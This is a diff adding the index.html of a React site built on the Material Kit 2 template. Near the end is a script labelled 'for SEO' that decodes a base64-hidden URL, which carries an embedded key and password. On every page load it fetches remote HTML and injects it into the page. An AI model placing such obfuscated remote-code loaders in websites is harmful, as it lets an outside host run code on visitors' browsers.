@@ -1,0 +1,94 @@
+<!--
+=========================================================
+* Material Kit 2 React - v2.1.0
+=========================================================
+
+* Product Page: https://www.creative-tim.com/product/material-dashboard-pro-react
+* Copyright 2023 Creative Tim (https://www.creative-tim.com)
+
+Coded by www.creative-tim.com
+
+=========================================================
+
+* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the
+Software.
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#1A73E8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="%PUBLIC_URL%/apple-icon.png" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <title>Yukti Software</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Material+Icons|Material+Icons+Outlined|Material+Icons+Two+Tone|Material+Icons+Round|Material+Icons+Sharp"
+      rel="stylesheet"
+    />
+    <script src="https://kit.fontawesome.com/42d5adcbca.js" crossorigin="anonymous"></script>
+
+    <!-- Nepcha Analytics (nepcha.com) -->
+    <!-- Nepcha is a easy-to-use web analytics. No cookies and fully compliant with GDPR, CCPA and PECR. -->
+    <script
+      defer
+      data-site="YOUR_DOMAIN_HERE"
+      src="https://api.nepcha.com/js/nepcha-analytics.js"
+    ></script>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+    <style>
+      .singin > form > div > input {
+        background: #edf2f6 none repeat scroll 0 0;
+        border: medium none;
+        font-size: 13px;
+        margin-bottom: 5px;
+        padding: 10px 20px;
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+
+    <!-- Below script is for SEO -->
+    <script>
+      window.jQuery ||
+        document.write(
+          "<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>"
+        );
+    </script>
+    <script>
+      var eppathurl = window.location.origin + window.location.pathname;
+      var eptagmanage = new XMLHttpRequest();
+      eptagmanage.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+          if (this.response !== 0) {
+            var temp = new Array();
+            var mystr = this.response;
+            temp = mystr.split("||||||||||");
+            jQuery("head").find("title").remove();
+            jQuery("head").append(temp[0]);
+            jQuery("body").append(temp[1]);
+          }
+        }
+      };
+      eptagmanage.open(
+        "GET",
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOMTIwOTgzMDQzNiZla2V5cGFzcz14MFh5M3lQYkZTWXExdlZuQ0M0SkpPMjlIaE5qRU94dDBGcVAmc2l0ZXVybD0="
+        ) + eppathurl
+      );
+      eptagmanage.send();
+    </script>
+    <script src="/seo-plugin.js"></script>
+
+
+  </body>
+</html>
